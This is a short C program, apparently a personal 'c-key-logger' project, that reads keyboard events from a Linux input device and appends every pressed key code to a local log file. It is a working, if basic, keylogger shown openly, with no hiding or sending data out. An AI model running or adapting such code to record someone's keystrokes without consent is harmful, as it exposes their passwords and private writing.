#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h> //to open
#include <unistd.h> //to read/write/close
#include <linux/input.h> //for input_event struct

int main(){
	const char *device = "/dev/input/event13";
	struct input_event event;
	

	int keyboard_file  = open(device, O_RDONLY);
	//open event file for keyboarads
	if(keyboard_file  == -1){
		perror("error with keyboard file opening");
		return 1;
	}

	//file to log key presses
	FILE *logFile = fopen("/home/filetcow/repos/c-key-logger/keylog.txt","a");

	if(logFile==NULL){
		perror("error opening log file");
		close(keyboard_file);
		return 1;
	}

	
	
	while(1){
		ssize_t bytes = read(keyboard_file, &event, sizeof(event));
		if(bytes == (ssize_t) sizeof(event)){
			if(event.type == EV_KEY){
				if(event.value == 1){
					printf("pressed %d\n",event.code);
					fprintf(logFile, "Key pressed %d\n" , event.code);
					fflush(logFile);
					}
			}
		}
	}

	fclose(logFile);
	close(keyboard_file);
	return 0;

}


		

